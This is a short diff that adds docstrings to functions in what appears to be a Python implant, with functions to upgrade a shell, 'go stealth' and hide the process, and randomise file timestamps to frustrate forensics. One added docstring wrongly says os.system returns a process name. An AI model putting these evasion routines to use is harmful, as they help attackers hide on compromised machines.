@@ -213,9 +213,9 @@ def get_pname(pid):
 	"""
 	get name of function from pid
 	Args:
-		pid:
+		pid: pid of process
 
-	Returns:
+	Returns: name of process
 
 	"""
 	return os.system(f"ps -o cmd= {pid}")
@@ -236,7 +236,7 @@ def upgrade_shell():
 def become_silent():
 	"""
 	Go stealth, move to secret location, set presence IOC
-	Returns:
+	Returns: Kills process if not covert or already on system
 
 	"""
 
@@ -267,9 +267,9 @@ def randomize_timestamp(file):
 	"""
 	Generate random timestamp for files created between a year and 6 months ago
 	Args:
-		file:
+		file: filename 
 
-	Returns:
+	Returns: sets file timestamp
 
 	"""
 	set_stamp = time.time() - random.randrange(15778463, 31556926)
